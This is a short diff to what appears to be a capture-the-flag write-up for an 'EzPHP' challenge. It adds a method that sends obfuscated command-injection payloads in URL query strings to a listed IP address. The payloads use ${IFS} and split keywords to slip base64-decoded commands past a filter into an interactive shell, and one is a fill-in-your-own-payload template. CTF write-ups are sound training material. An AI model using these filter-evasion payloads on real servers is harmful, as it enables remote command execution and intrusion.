@@ -12,7 +12,14 @@ Useful tool : https://3v4l.org/Nk2DT
 
 by @fredd#8512
 
-## Method 1 : God Solution 
+## Method 2 : Shell with base64
+```
+http://35.197.133.28:8091/?cmd=sh%20-c%20$(printf${IFS}pri%27%27ntf)${IFS}aWQK|$(printf${IFS}ba%27%27se64)${IFS}-d|sh${IFS}-i
+
+http://35.197.133.28:8091/?cmd=sh%20-c%20$(printf${IFS}pri%27%27ntf)${IFS}<ใส่ base64 ตรงนี้>|$(printf${IFS}ba%27%27se64)${IFS}-d|sh${IFS}-i
+```
+
+## Method 3 : God Solution 
 
 For EzPHP
 
